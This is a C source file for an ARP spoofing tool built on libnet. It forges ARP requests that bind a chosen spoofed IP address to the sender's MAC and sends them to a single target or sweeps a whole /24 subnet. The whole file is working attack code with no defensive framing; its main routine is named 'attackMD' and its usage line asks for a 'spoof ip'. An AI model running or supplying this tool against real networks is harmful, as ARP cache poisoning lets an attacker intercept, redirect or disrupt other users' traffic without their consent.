#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <libnet.h>
#include <getopt.h>
#include "formater.h"
#include "macresolv.h"

static struct option long_opts[] = {
	{"target", required_argument, 0, 't'},
	{"ip",     required_argument, 0, 'i'},
	{"mac",    required_argument, 0, 'm'},
	{0, 0, 0, 0}
};

void diefMD(char *str) {
	fprintf(stderr, "[-] %s", str);
	exit(EXIT_FAILURE);
}

void dienMD(libnet_t *libnet, char *str) {
	fprintf(stderr, "[-] %s: %s\n", str, libnet_geterror(libnet));
	exit(EXIT_FAILURE);
}

int usageMD(char *bin) {
	fprintf(stderr, "Usage: %s --ip [spoof ip] --target [host ip] --mac [host mac]\n", bin);
	return EXIT_FAILURE;
}

int attackMD(libnet_t *libnet, libnet_ptag_t tag, uint8_t *hostmac) {
	u_int8_t *packet;
	u_int32_t packet_s;
	int i;
	
	if(tag == -1)
		dienMD(libnet, "arp header");
	
	if((tag = libnet_autobuild_ethernet(hostmac, ETHERTYPE_ARP, libnet)) == -1)
		dienMD(libnet, "ethernet header");
	
	if(libnet_adv_cull_packet(libnet, &packet, &packet_s) == -1)
		dienMD(libnet, "packet");
		
	printf("[+] packet size: %u\n", packet_s);
	
	if((i = libnet_write(libnet)) == -1)
		dienMD(libnet, "write");

	printf("[+] %u bytes sent\n", i);
	
	return i;
}

int main(int argc, char *argv[]) {
	libnet_t *libnet;
	libnet_ptag_t tag;
	
	char *hostmac_resolv, *dip;
	uint8_t *hostmac = NULL;
	int hostmac_len;
	struct libnet_ether_addr *localmac_net;
	u_char localmac[ETH_ALEN];
	
	uint32_t localip;
	
	int32_t init_target = 0, init_host = 0;
	u_char target[IP_ALEN], host[IP_ALEN];
	
	char errbuf[LIBNET_ERRBUF_SIZE], temp[128], ipstr[128];
	int i, j = 0;
	
	/*
	 * initializing stuff
	 */
	if(!(libnet = libnet_init(LIBNET_LINK_ADV, INTERFACE, errbuf)))
		diefMD(errbuf);
	
	localmac_net = libnet_get_hwaddr(libnet);
	memcpy(localmac, localmac_net, ETH_ALEN);
	
	/*
	 * grabbing commands options
	 */
	while(1) {
		if((i = getopt_long(argc, argv, "t:i:m:", long_opts, &j)) == -1)
			break;

		switch(i) {
			case 't':
				if((init_target = libnet_name2addr4(libnet, optarg, LIBNET_RESOLVE)) == -1)
					dienMD(libnet, "target");
				
				memcpy(&target, (char *) &init_target, IP_ALEN);
			break;
			
			case 'i':
				if((init_host = libnet_name2addr4(libnet, optarg, LIBNET_RESOLVE)) == -1)
					dienMD(libnet, "ipcache");
				
				memcpy(&host, (char *) &init_host, IP_ALEN);
				
				dip = optarg;
			break;
			
			case 'm':
				hostmac = libnet_hex_aton(optarg, &hostmac_len);
			break;
			
			case '?':
				return usageMD(argv[0]);
			break;

			default:
				abort();
		}
	}
	
	// checking if all options are set        
	if(!init_host || !init_target)
		return usageMD(argv[0]);
	
	// summary        
	printf("[+] local mac address: %s\n", format_macMD((unsigned char *) localmac, temp));
	
	if(!hostmac) {
		printf("[-] host mac not set, trying to resolv it (%s)\n", dip);
		
		// dump mac to string
		format_macMD((unsigned char *) localmac, temp);
		
		// dump ip to string
		localip = libnet_get_ipaddr4(libnet);
		format_ipMD((unsigned char *) &localip, ipstr);
		printf("[+] local ip address: %s\n", ipstr);
		
		// resolving
		if(!(hostmac_resolv = macresolvMD(temp, ipstr, dip)))
			diefMD("cannot resolve target mac");
		
		hostmac = libnet_hex_aton(hostmac_resolv, &hostmac_len);
	}	

	printf("[+] cache mac address: %s\n", format_macMD((unsigned char *) hostmac, temp));

	/*
	 * building and sending arp stuff
	 */
	
	// we got /24
	if(target[3] == 0) {
		while(++target[3]) {
			tag = libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, ETH_ALEN, IP_ALEN, ARPOP_REQUEST, 
			                       localmac, target, hostmac, host, NULL, 0, libnet, 0);

			attackMD(libnet, tag, hostmac);
		}
		
	} else {
		tag = libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, ETH_ALEN, IP_ALEN, ARPOP_REQUEST, 
				       localmac, target, hostmac, host, NULL, 0, libnet, 0);

		attackMD(libnet, tag, hostmac);
	}
	
	libnet_destroy(libnet);
	return 0;
}
